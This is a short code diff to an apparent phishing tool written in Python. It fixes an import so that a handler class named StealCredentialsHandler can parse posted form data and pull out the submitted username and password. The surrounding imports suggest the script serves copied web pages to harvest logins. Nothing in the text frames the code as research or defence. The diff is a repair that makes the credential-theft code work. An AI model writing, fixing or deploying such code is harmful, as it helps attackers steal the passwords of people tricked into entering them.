@@ -1,7 +1,7 @@
 import os
 import requests
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, parse_qs
 from http.server import SimpleHTTPRequestHandler, HTTPServer, BaseHTTPRequestHandler
 import socketserver
 from threading import Thread
@@ -73,7 +73,7 @@ class StealCredentialsHandler(BaseHTTPRequestHandler):
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
-        parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))
+        parsed_data = parse_qs(post_data.decode('utf-8'))
 
         username = parsed_data.get('username', [''])[0]
         password = parsed_data.get('password', [''])[0]
